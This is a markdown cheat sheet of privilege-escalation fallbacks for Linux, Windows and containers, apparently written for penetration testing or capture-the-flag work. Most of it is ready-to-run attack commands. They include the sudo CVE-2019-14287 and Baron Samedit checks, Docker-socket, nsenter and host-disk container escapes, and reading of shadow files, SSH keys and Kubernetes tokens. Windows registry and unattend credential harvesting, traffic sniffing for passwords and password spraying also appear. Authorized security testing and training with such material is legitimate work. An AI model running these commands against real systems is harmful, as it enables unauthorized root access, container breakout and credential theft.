# Failure Recovery — When Standard Privesc Fails

Systematic fallback procedures when the obvious paths don't work.

---

## No SUID Binaries Found

```bash
# Standard SUID search returned nothing useful:
find / -perm -4000 -type f 2>/dev/null
# Only standard system binaries (mount, umount, su, passwd, ping)

# FALLBACK 1: Check Linux capabilities (often overlooked)
getcap -r / 2>/dev/null
# Look for: cap_setuid, cap_dac_override, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace
# Even cap_net_bind_service on a script interpreter can be useful

# FALLBACK 2: Check for cron jobs with pspy
# Many privesc paths aren't visible from file permissions alone
./pspy64 -pf -i 1000
# Watch for: UID=0 processes, scripts running as root, relative path commands
# Run for 5+ minutes to catch hourly/periodic jobs

# FALLBACK 3: Check for writable PATH directories
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done
# If any are writable AND a root process calls a command without absolute path → PATH hijack

# FALLBACK 4: Check for writable files owned by root
find / -writable -user root -type f 2>/dev/null | grep -vE "^/(proc|sys|dev)"
# Look for: scripts, configs, service files

# FALLBACK 5: Check for world-writable directories used by root processes
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys|dev|tmp|var/tmp)"
# If root writes to or reads from these directories → race condition or file plant

# FALLBACK 6: Check for readable sensitive files
cat /etc/shadow 2>/dev/null          # Sometimes readable by non-root groups
ls -la /root/ 2>/dev/null            # Sometimes r-x for group
find / -name "id_rsa" -readable 2>/dev/null
find / -name "*.kdbx" -readable 2>/dev/null
find / -name ".env" -readable 2>/dev/null
grep -rni "password" /var/www/ /opt/ /home/ --include="*.conf" --include="*.php" --include="*.py" --include="*.env" 2>/dev/null | head -30
```

---

## Sudo Requires Password

```bash
sudo -l
# Sorry, user may not run sudo.
# OR: (ALL) ALL — but requires password we don't have

# FALLBACK 1: Check sudo version for Baron Samedit
sudo --version
# If sudo 1.8.2 through 1.9.5p1:
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# Segfault = vulnerable → exploit CVE-2021-3156

# FALLBACK 2: Check env_keep for LD_PRELOAD/LD_LIBRARY_PATH
sudo -l 2>/dev/null | grep -i "env_keep"
# If LD_PRELOAD is kept → LD_PRELOAD injection (even with password-required sudo,
# if user knows password for ONE allowed command)

# FALLBACK 3: Check if sudo token is cached
sudo -n true 2>/dev/null && echo "TOKEN CACHED — no password needed!" || echo "no cache"
# If cached (user recently ran sudo): sudo -s

# FALLBACK 4: Check for allowed commands with shell escapes
sudo -l 2>/dev/null
# Even if password required — if we find the password later, know which commands escape:
# vim, vi, less, more, man, ftp, gdb, awk, find, nmap, python, perl, ruby, lua, irb
# See GTFOBins for full list

# FALLBACK 5: Check if current user's password is reused
# Try credentials found elsewhere (web app DB, config files)
# su - root (try discovered passwords)
# su - <other_users> (lateral move, then check their sudo -l)

# FALLBACK 6: Check sudo timestamp file
ls -la /var/run/sudo/ts/ 2>/dev/null
ls -la /run/sudo/ts/ 2>/dev/null
# If another user's sudo timestamp exists and is recent → that user has cached creds

# FALLBACK 7: CVE-2019-14287 (sudo < 1.8.28)
# If sudoers has: (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
# The -1 UID wraps to 0 (root) in vulnerable versions
```

---

## Kernel Exploit Fails

```bash
# Exploit compiled but crashes/doesn't work

# FALLBACK 1: Try different compile flags
gcc exploit.c -o exploit -static            # Static linking (no library deps)
gcc exploit.c -o exploit -static -pthread    # With threading support
gcc exploit.c -o exploit -m32 -static       # 32-bit on 64-bit system
gcc exploit.c -o exploit -lpthread -lcrypt   # Explicit library linking

# FALLBACK 2: Try precompiled binary
# Many exploit repos ship precompiled binaries for multiple architectures
# Check: github releases, exploit-db compiled sections
# Transfer precompiled binary instead of compiling on target

# FALLBACK 3: Check kernel protections
grep -i smep /proc/cpuinfo                       # Supervisor Mode Execution Prevention
grep -i smap /proc/cpuinfo                       # Supervisor Mode Access Prevention
cat /proc/sys/kernel/randomize_va_space           # ASLR: 0=off, 1=partial, 2=full
cat /proc/sys/kernel/kptr_restrict                # Kernel pointer restriction: 0=exposed, 1/2=hidden
cat /proc/sys/kernel/dmesg_restrict               # dmesg access: 0=all, 1=root only
cat /boot/config-$(uname -r) 2>/dev/null | grep -iE "SMEP|SMAP|KASLR|KASAN|USERCOPY"
# If SMEP/SMAP/KASLR enabled → some exploits won't work without bypass

# FALLBACK 4: Try a different exploit for the same version
# DirtyPipe failed? → Try OverlayFS or GameOverlay
# PwnKit failed (pkexec not SUID)? → Try Baron Samedit
# Always have 2-3 exploits ready for the same kernel range

# FALLBACK 5: Try userland exploits instead of kernel
# PwnKit (pkexec) — technically userland, not kernel
# Baron Samedit (sudo) — heap overflow in userland
# Looney Tunables (glibc) — ld.so overflow
# These are safer and more reliable than kernel exploits

# FALLBACK 6: Abandon kernel exploit → try misconfig-based privesc
# Kernel exploit should be last resort anyway
# Go back to: cron jobs, capabilities, services, file permissions
```

---

## Windows Tokens Not Available

```powershell
# whoami /priv shows no useful privileges (no SeImpersonate, no SeBackup, etc.)

# FALLBACK 1: Check other service accounts
# If you have access to multiple services:
Get-WmiObject Win32_Service | Where-Object {$_.StartName -ne "LocalSystem"} | Select Name,StartName,PathName
# Try to compromise a service running as a higher-privileged account

# FALLBACK 2: Scheduled task abuse
schtasks /query /fo LIST /v | findstr /i "task to run\|run as\|author"
# Find tasks running as SYSTEM with writable binaries:
# For each task binary path:
icacls "C:\path\to\task_binary.exe"

# FALLBACK 3: Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
# Create binary in writable directory along the unquoted path

# FALLBACK 4: DLL sideloading / hijacking
# Find applications that load DLLs from writable locations
# Use Process Monitor (if you can run it) or check known DLL hijack targets:
# Common targets: applications in C:\Program Files\ with writable subdirs
# Check PATH directories:
echo %PATH%
# Writable PATH dir + application that searches PATH for DLL = hijack

# FALLBACK 5: Stored credentials
cmdkey /list
# If entries exist: runas /savecred /user:<domain\admin> cmd.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>nul
dir /s /b C:\unattend.xml C:\sysprep.inf 2>nul
type C:\Windows\Panther\unattend.xml 2>nul
# Search for credentials in files:
findstr /si "password" C:\*.xml C:\*.ini C:\*.txt C:\*.config 2>nul

# FALLBACK 6: Check for AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# FALLBACK 7: UAC bypass (if in Administrators group but medium integrity)
whoami /groups | findstr /i "S-1-5-32-544"
# If member of Administrators but running at Medium integrity → UAC bypass
# fodhelper, eventvwr, computerdefaults (see windows_privesc.md)

# FALLBACK 8: Local admin password reuse
# If you crack any local admin hash → try it on other machines
# Many orgs reuse local admin passwords across workstations
```

---

## Container Environment Detected

```bash
# You're inside a container — standard Linux privesc may not apply

# Step 1: Confirm container type
cat /proc/1/cgroup 2>/dev/null | head -5
ls /.dockerenv 2>/dev/null
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "kube|docker|container"
hostname  # Random hex = Docker, descriptive = Kubernetes pod

# Step 2: Check for Docker socket (instant escape)
ls -la /var/run/docker.sock 2>/dev/null
# If exists → docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# Step 3: Check capabilities
capsh --print 2>/dev/null
cat /proc/1/status | grep -i cap
# Decode hex: capsh --decode=<CapEff_hex>
# Key caps: cap_sys_admin → mount host fs
#           cap_sys_ptrace → inject into host processes
#           cap_net_admin → network manipulation
#           cap_dac_override → read/write any file

# Step 4: Check if privileged container
ip link add dummy0 type dummy 2>/dev/null
if [ $? -eq 0 ]; then
    echo "PRIVILEGED CONTAINER"
    ip link delete dummy0
    # → Use cgroup release_agent escape (see container_escape.md)
fi

# Step 5: Check /proc/1/cgroup for host path (needed for cgroup escape)
cat /proc/1/cgroup | grep -oP 'docker/\K[a-f0-9]+'
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab

# Step 6: Check for mounted host paths
mount | grep -vE "proc|sys|cgroup|devpts|mqueue|shm"
ls -la /host/ /mnt/ /hostfs/ 2>/dev/null
# If host filesystem is mounted → direct access

# Step 7: Check for host PID namespace
ls /proc/ | wc -l
# Many processes (100+) = likely sharing host PID namespace
# If sharing → nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Step 8: Kubernetes-specific checks
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
# If service account token exists:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# Check permissions — can we create pods?
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Step 9: Check available block devices
fdisk -l 2>/dev/null
lsblk 2>/dev/null
# If /dev/sda1 visible and cap_sys_admin:
mkdir /tmp/hostfs && mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs /bin/bash

# Step 10: Network-based escape
# Check for other services reachable from container
ip route  # Find gateway (usually host)
# Scan host internal services:
for port in 22 80 443 2375 2376 5000 6443 8080 8443 10250; do
    (echo >/dev/tcp/172.17.0.1/$port) 2>/dev/null && echo "Host port $port OPEN"
done
# 2375/2376 = Docker API (unauthenticated = full escape)
# 10250 = Kubelet (may allow command execution)
# 6443 = K8s API server

# IF ALL CONTAINER ESCAPES FAIL:
# You may be in a hardened container (rootless Docker, gVisor, Kata)
# Check: cat /proc/version (gVisor shows different kernel)
# Option: escalate within container for lateral movement to other containers
# Option: attack services reachable from container network
```

---

## Generic Fallback Checklist

When nothing obvious works, go through this systematically:

```
1. [ ] Re-run enumeration with different tool (linpeas → lse.sh → manual)
2. [ ] Check ALL users' home directories for credentials
3. [ ] Search for password files: find / -name "*.conf" -exec grep -li "pass" {} \; 2>/dev/null
4. [ ] Check running processes for credentials in command lines: ps auxwww
5. [ ] Monitor network traffic for cleartext creds: tcpdump -i lo -A -s 0 2>/dev/null
6. [ ] Check for internal services (databases, APIs) with default creds
7. [ ] Look for backup files: find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
8. [ ] Check for SSH keys: find / -name "id_rsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null
9. [ ] Check mail: cat /var/mail/* /var/spool/mail/* 2>/dev/null
10. [ ] Check browser/app credential stores in user home dirs
11. [ ] Try password spraying with found passwords against all local users
12. [ ] Check for CVEs in installed third-party software: dpkg -l / rpm -qa → searchsploit
13. [ ] Look for custom applications with misconfigs: find /opt /srv /usr/local -type f 2>/dev/null
14. [ ] Check for writable /etc/ld.so.conf.d/ entries (shared library injection)
15. [ ] Check for writable init scripts: ls -la /etc/init.d/ /etc/rc*.d/ 2>/dev/null
```
